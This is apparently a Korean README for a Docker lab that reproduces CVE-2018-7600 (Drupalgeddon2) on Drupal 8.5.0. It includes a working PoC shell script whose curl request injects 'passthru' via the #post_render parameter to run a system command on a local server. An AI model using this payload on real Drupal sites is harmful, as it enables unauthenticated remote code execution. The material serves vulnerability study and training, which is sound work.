# CVE-2018-7600 - Drupalgeddon2 (Drupal 8.5.0 RCE)

## 1. 개요
- Drupal 8.5.0 버전에서 발생한 인증 없는 원격 코드 실행(RCE) 취약점이다.
- Form API 처리 로직의 결함을 통해 외부 사용자가 서버 명령어를 실행할 수 있다.

## 2. 취약점 원인
- Drupal이 사용자로부터 받은 `#post_render` 파라미터를 제대로 검증하지 않고 그대로 실행한다.
- 이로 인해 원격 사용자가 서버 측에서 임의의 PHP 함수나 시스템 명령어를 실행할 수 있다.

## 3. 환경 구축 (완전 자동화)

- `docker compose up -d` 명령어로 즉시 설치 완료된 Drupal 8.5.0 환경이 실행된다.

- `settings.php`, `init.sql` 설정파일 백업본 적용
- 별도의 수동 설치 과정 없이, 웹 접속 시 바로 Drupal 메인 화면을 확인할 수 있다.

**구성 자동화 방식:**
- `settings.php`: Drupal 설치 완료 상태 파일을 컨테이너 실행 시 복사
- `init.sql`: DB 초기 데이터 세팅을 컨테이너 시작 시 자동 적용

## 4. 실습 (PoC)

- PoC를 실행하는 방법은 준비된 `poc_exploit.sh` 스크립트를 실행하는 것이다.
- 해당 스크립트는 Drupal 서버에 취약한 요청을 보내고 명령어 실행 결과를 확인할 수 있다.

### PoC 스크립트 (poc_exploit.sh)
명령어 자동실행
```
#!/bin/bash

echo "[*] Drupal CVE-2018-7600 PoC 실행 중..."

response=$(curl -k -s -X POST "http://localhost:8080/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" \
-H "Content-Type: application/x-www-form-urlencoded" \
--data "form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=passthru&mail[a][#markup]=id")

echo "[+] 서버 응답:"
echo "$response"
```

실행코드
```
chmod +x poc_exploit.sh
./poc_exploit.sh
```

## 5. 결과
[![image](https://github.com/won6c/whitehat-school-vulhub/blob/main/CVE-2021-22205/1.png)]
[![image](https://github.com/Thengelsec/kr-vulhub/raw/main/1.png)]

- PoC를 실행하는 방법은 준비된 `poc_exploit.sh` 스크립트를 실행하는 것이다.